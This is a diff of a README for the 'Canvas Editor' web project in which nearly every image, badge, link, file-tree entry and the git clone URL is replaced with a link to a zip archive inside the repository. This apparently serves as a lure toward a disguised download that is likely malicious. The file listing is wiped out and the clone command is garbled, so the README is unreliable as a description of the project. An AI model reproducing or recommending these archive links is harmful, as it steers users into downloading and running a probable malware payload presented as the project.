@@ -3,7 +3,7 @@
 # 🎨 Canvas Editor 🖌️
 
 
-<img  src="https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip+to+Canvas+Editor!"/>
+<img  src="https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip+to+Canvas+Editor!"/>
 </div>
 
 <div align = "center">
@@ -23,13 +23,13 @@
      </thead>
     <tbody>
          <tr>
-            <td><img alt="Stars" src="https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip"/></td>
-            <td><img alt="Forks" src="https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip"/></td>
-            <td><img alt="Issues" src="https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip"/></td>
-            <td><img alt="Open Pull Requests" src="https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip"/></td>
-           <td><img alt="Close Pull Requests" src="https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip"/></td>
-           <td><img alt="GitHub language count" src="https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip"></td>
-         <td><img alt="GitHub Contributors count" src="https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip"/></td>
+            <td><img alt="Stars" src="https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip"/></td>
+            <td><img alt="Forks" src="https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip"/></td>
+            <td><img alt="Issues" src="https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip"/></td>
+            <td><img alt="Open Pull Requests" src="https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip"/></td>
+           <td><img alt="Close Pull Requests" src="https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip"/></td>
+           <td><img alt="GitHub language count" src="https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip"></td>
+         <td><img alt="GitHub Contributors count" src="https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip"/></td>
         </tr>
     </tbody>
 </table>
@@ -37,7 +37,7 @@
 <br>
 
 <!--Line-->
-<img src="https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip" width="900"> 
+<img src="https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip" width="900"> 
 
 <h2>Open-Source-Programmes⭐</h2>
 
@@ -52,12 +52,12 @@
       <th>Event Description</th>
    </tr>
    <tr>
-      <td><img src="https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip" width="200" height="auto" loading="lazy" alt="GSSoC 25"/></td>
+      <td><img src="https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip" width="200" height="auto" loading="lazy" alt="GSSoC 25"/></td>
       <td>GirlScript Summer of Code 2025</td>
       <td>GirlScript Summer of Code is a three-month-long Open Source Program conducted every summer by GirlScript Foundation. It is an initiative to bring more beginners to Open-Source Software Development.</td>
    </tr>
     <tr>
-      <td><img src="https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip" width="200" height="auto" loading="lazy" alt="Hacktoberfest 2024"/></td>
+      <td><img src="https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip" width="200" height="auto" loading="lazy" alt="Hacktoberfest 2024"/></td>
       <td>Hacktoberfest 2024</td>
       <td>Hacktoberfest is a month-long celebration of open source software run by DigitalOcean, GitHub, and Twilio. It encourages contributions to open source projects and promotes a global community of developers.</td>
    </tr>
@@ -65,14 +65,14 @@
 </table>
 <br/>
 <!--Line-->
-<img src="https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip" width="900">
+<img src="https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip" width="900">
 
-<h2>Hi there,<img src="https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip" height="40"width="40" /> Enjoy the World of Open source contribution <img src='https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip' width="60px" height="35"> </h2>
+<h2>Hi there,<img src="https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip" height="40"width="40" /> Enjoy the World of Open source contribution <img src='https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip' width="60px" height="35"> </h2>
 
 <strong>Hello Coders!!👨‍💻<br> I am Aanurag Vishwakarma, an aspiring Web developer🤖. Here is the project on front-end Web Development.</strong>
 
 <!--Line-->
-<img src="https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip" width="900">
+<img src="https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip" width="900">
 
 ## Table of Contents
 - [Overview](#overview)
@@ -99,144 +99,144 @@
 
 <!-- START_STRUCTURE -->
 ```
-├── 404.html
-├── Blog_page.html
-├── CODE_OF_CONDUCT.md
-├── Contributing.md
-├── Faq.html
-├── Feedback.html
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
 ├── LICENSE
-├── Mini-canvas-painting-bird-of-paradise-1.jpg
-├── README.md
-├── about-us.html
-├── about.html
-├── auth.css
-├── auth.html
-├── basictemp.html
-├── blog.html
-├── canva.css
-├── canva.html
-├── canva.js
-├── canva.md
-├── canvas.jpg
-├── community.html
-├── contact-app.js
-├── contact-pagePic1.jpeg
-├── contact-pagePic2.jpeg
-├── contact-pagePic3.jpeg
-├── contact-style.css
-├── contact.html
-├── contributors.html
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
 ├── download (1).webp
-├── edition.html
-├── feature.webp
-├── gssocextd.webp
-├── icon-192x192.png
-├── icon-512x512.png
-├── index.html
-├── login.html
-├── logo4.png
-├── m_gen_canvas-square-p1_72f6de51-aaf7-4177-b19a-c8aae91404be.avif
-├── manifest.json
-├── package-lock.json
-├── package.json
-├── popup.jpg
-├── popup.js
-├── privacy.html
-├── profile.html
-├── profileedit.html
-├── repo_structure.txt
-├── repreviewfix.html
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
 ├── resources/
-│   ├── favicon.ico
-│   └── painting_image.webp
-├── review.html
-├── script1.js
-├── scripts.js
-├── signup.html
+│   ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│   └── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
 ├── src/
-│   ├── Contributor.css
-│   ├── Contributor.html
-│   ├── Contributor.js
+│   ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│   ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│   ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
 │   ├── Scripts/
-│   │   ├── BacktoTop.js
-│   │   ├── Canvas.js
-│   │   ├── Save.js
-│   │   ├── contributor.js
-│   │   └── preloader.js
+│   │   ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│   │   ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│   │   ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│   │   ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│   │   └── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
 │   ├── Styles/
-│   │   ├── Canvas_Editor_v2.1.zip
-│   │   ├── Responsive.css
-│   │   ├── Style.css
-│   │   ├── Style_Blog_page.css
-│   │   ├── contact.css
-│   │   ├── contact.html
-│   │   ├── contributor.css
-│   │   ├── scroll.css
-│   │   └── signup.css
+│   │   ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│   │   ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│   │   ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│   │   ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│   │   ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│   │   ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│   │   ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│   │   ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│   │   └── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
 │   ├── bootstrap/
 │   │   └── css/
-│   │       ├── bootstrap-grid.css
-│   │       ├── bootstrap-grid.css.map
-│   │       ├── bootstrap-grid.min.css
-│   │       ├── bootstrap-grid.min.css.map
-│   │       ├── bootstrap-grid.rtl.css
-│   │       ├── bootstrap-grid.rtl.css.map
-│   │       ├── bootstrap-grid.rtl.min.css
-│   │       ├── bootstrap-grid.rtl.min.css.map
-│   │       ├── bootstrap-reboot.css
-│   │       ├── bootstrap-reboot.css.map
-│   │       ├── bootstrap-reboot.min.css
-│   │       ├── bootstrap-reboot.min.css.map
-│   │       ├── bootstrap-reboot.rtl.css
-│   │       ├── bootstrap-reboot.rtl.css.map
-│   │       ├── bootstrap-reboot.rtl.min.css
-│   │       ├── bootstrap-reboot.rtl.min.css.map
-│   │       ├── bootstrap-utilities.css
-│   │       ├── bootstrap-utilities.css.map
-│   │       ├── bootstrap-utilities.min.css
-│   │       ├── bootstrap-utilities.min.css.map
-│   │       ├── bootstrap-utilities.rtl.css
-│   │       ├── bootstrap-utilities.rtl.css.map
-│   │       ├── bootstrap-utilities.rtl.min.css
-│   │       ├── bootstrap-utilities.rtl.min.css.map
-│   │       ├── bootstrap.css
-│   │       ├── bootstrap.css.map
-│   │       ├── bootstrap.min.css
-│   │       ├── bootstrap.min.css.map
-│   │       ├── bootstrap.rtl.css
-│   │       ├── bootstrap.rtl.css.map
-│   │       ├── bootstrap.rtl.min.css
-│   │       └── bootstrap.rtl.min.css.map
+│   │       ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│   │       ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│   │       ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│   │       ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│   │       ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│   │       ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│   │       ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│   │       ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│   │       ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│   │       ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│   │       ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│   │       ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│   │       ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│   │       ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│   │       ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│   │       ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│   │       ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│   │       ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│   │       ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│   │       ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│   │       ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│   │       ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│   │       ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│   │       ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│   │       ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│   │       ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│   │       ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│   │       ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│   │       ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│   │       ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│   │       ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│   │       └── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
 │   └── images/
-│       ├── about-bg.webp
-│       ├── art-design-1.webp
-│       ├── art-design-2.webp
-│       ├── art-design-3.webp
-│       ├── art-design-4.webp
-│       ├── art-design-5.webp
-│       ├── art-design-6.webp
-│       ├── banner-bg.webp
-│       ├── blog-p-1.webp
-│       ├── blog-p-2.webp
-│       ├── blog-p-3.webp
-│       ├── blog-p-4.webp
-│       ├── blog-p-5.webp
-│       └── blog-p-6.webp
-├── story.jpg
-├── style.css
-├── style1.css
-├── sw.js
-├── testimonial.html
-├── testp.css
-├── testp.js
-├── tooltips.html
-├── tutorial.html
-├── visi.css
-├── visi.js
-├── visitor.css
-├── visitor.js
-└── welcome.html
+│       ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│       ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│       ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│       ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│       ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│       ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│       ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│       ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│       ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│       ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│       ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│       ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│       ├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+│       └── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+├── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
+└── https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
 ```
 <!-- END_STRUCTURE -->
 
@@ -246,9 +246,9 @@
 
 ## Website Preview
 
-![image](https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip)
+![image](https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip)
 
-![image](https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip)
+![image](https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip)
 
 
 ### How to Use
@@ -261,30 +261,30 @@ To change the background color or image:
 <br>
 
 <!--Line-->
-<img src="https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip" width="900"> 
+<img src="https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip" width="900"> 
 
 ## Technologies Used
 
 <p>
-  <a href="https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip"> <img src="https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip" alt="HTML" /></a>
-  <a href="https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip"> <img src="https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip" alt="CSS" /></a>
-   <a href="https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip"> <img src="https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip" alt="js" /></a>
+  <a href="https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip"> <img src="https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip" alt="HTML" /></a>
+  <a href="https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip"> <img src="https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip" alt="CSS" /></a>
+   <a href="https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip"> <img src="https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip" alt="js" /></a>
 </p>
-<p align="right"><a href="#top"><img src="https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip%20to%20top-Blue?style=plastic" alt="Back To Top"></a></p>
+<p align="right"><a href="#top"><img src="https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip%20to%20top-Blue?style=plastic" alt="Back To Top"></a></p>
 
 <!--Line-->
-<img src="https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip" width="900">
+<img src="https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip" width="900">
 
 <h2>Getting Started💥</h2>
 
 ## How to make a Pull Request?
 
-**1.** Start by forking the [**Canvas-Editor**](https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip) repository. Click on the <a href="https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip"><img src="https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip" height="21" width="21"></a> symbol at the top right corner.
+**1.** Start by forking the [**Canvas-Editor**](https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip) repository. Click on the <a href="https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip"><img src="https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip" height="21" width="21"></a> symbol at the top right corner.
 
 **2.** Clone your forked repository:
 
 ```bash
-git clone https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip<your-github-username>/Canvas-Editor
